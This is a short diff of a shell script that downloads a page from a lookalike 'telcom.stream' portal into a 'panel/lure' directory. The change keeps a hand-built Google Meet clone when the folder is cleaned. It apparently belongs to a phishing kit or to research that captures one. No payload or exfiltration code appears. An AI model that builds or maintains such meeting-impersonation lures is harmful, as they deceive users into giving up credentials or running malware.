@@ -11,8 +11,9 @@ PORTAL="${PORTAL:-https://us05web.telcom.stream}"
 
 command -v curl >/dev/null 2>&1 || { echo "curl required" >&2; exit 1; }
 
-rm -rf "$OUT"
 mkdir -p "$OUT"
+# preserve the hand-built Google Meet clone in panel/lure/meet
+find "$OUT" -mindepth 1 -maxdepth 1 ! -name meet -exec rm -rf {} + 2>/dev/null || true
 
 # -L follows the portal's 307 to the meeting page; that page is the lure.
 curl -fsSL --max-time 30 "$PORTAL/" -o "$OUT/index.html"
